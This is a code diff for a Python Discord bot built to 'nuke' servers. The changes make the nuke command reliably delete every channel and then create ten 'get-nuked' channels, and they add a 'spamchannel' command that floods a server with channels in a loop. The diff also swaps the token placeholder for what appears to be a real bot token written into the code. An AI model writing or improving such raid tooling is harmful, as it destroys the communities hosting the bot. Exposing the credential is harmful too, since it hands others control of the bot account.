@@ -26,6 +26,7 @@ async def help(ctx):
   await ctx.send("3. nuke2 - nukes the server + adds a new channel 'whateverYouWant' = example: !nuke2 i+love+dogs")
   await ctx.send("4. spam - spams text = example: !spam hello+world")
   await ctx.send("5. game - simple guess the number game = example: !game 5 10 (the 5 is your guess, the 10 is the max. Every time you do !game the random number is different.)")
+  await ctx.send("6. spamchannel - spams channels = example: !spamchannel hello+world 10")
   await ctx.send("**REMEMBER** spaces are replaced with +")
   await ctx.send("--More soon--")
   
@@ -37,8 +38,15 @@ async def clear(ctx):
 async def nuke(ctx):
   guild = ctx.guild
   for channel in guild.channels:
-    await channel.delete()
-  channel = await guild. create_text_channel('get-nuked')
+    try:
+      await channel.delete()
+    except:pass
+  for i in range(10):
+    await guild.create_text_channel('get-nuked')
+@bot.command()
+async def spamchannel(ctx, spam1, amount):
+  guild = ctx.guild
+  for i in range(int(amount)):await guild.create_text_channel(str(spam1.replace("+", " ")))
 #@bot.event
 #async def on_message(message):
   #if "!spam" in message.content:
@@ -64,5 +72,5 @@ async def game(ctx, guess, max):
 for extension in extensions:
 		  bot.load_extension(extension)  # Loads every extension.
 
-token = "put your bot token here" 
+token = "OTU4MjAwNTQ4NzAyNzAzNzQ3.YkJ3zQ.alj8rC1Vsuqay_va5PgfxbOzE_c" 
 bot.run(token)  # Starts the bot
